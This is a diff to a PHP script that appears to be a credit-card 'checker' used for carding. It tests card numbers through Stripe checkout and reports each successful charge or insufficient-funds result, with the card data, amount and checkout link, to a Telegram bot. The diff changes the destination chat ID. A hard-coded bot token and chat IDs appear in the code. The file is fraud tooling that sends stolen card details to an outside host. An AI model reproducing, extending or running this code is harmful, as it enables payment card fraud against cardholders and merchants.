@@ -342,15 +342,15 @@ if (preg_match('/^4[0-9]{12}(?:[0-9]{3})?$/', $cc)) {
 
 $xamount = intval($xamount)/100;
 
-#############SEND TO TG BOT WHEN CHARGED
+#############SET DESTINATION OF YOUR TG BOT
 $botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
-$chatID = urlencode('-1001808253666');
+$chatID = urlencode('-1001815647781');
+
+#############SEND TO TG BOT WHEN CHARGED
 $charged_message = 'Successfull%20Checkout%0A%0ABIN:%0A'.$lista.'%0A%0AURL:%0A'.urlencode($success).'%0A%0AAmount:%0A'.strtoupper($currency).'%20'.$xamount.'%0A%0AChecked_from:%0A'.$domain.'';
 $sendcharged = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.$charged_message.'';
 
 #############SEND TO TG BOT WHEN INSUFFBAL
-$botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
-$chatID = urlencode('-1001808253666');
 $insuf_message = 'INSUFFICIENT%20FUNDS%0A%0ABIN:%0A'.$lista.'%0A%0AAmount_to_bill:%0A'.strtoupper($currency).'%20'.$xamount.'%0A%0AStripe%20Checkout%20link:%0A'.$colink.'%0A%0AChecked_from:%0A'.$domain.'';
 $sendinsuff = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.$insuf_message.'';
 
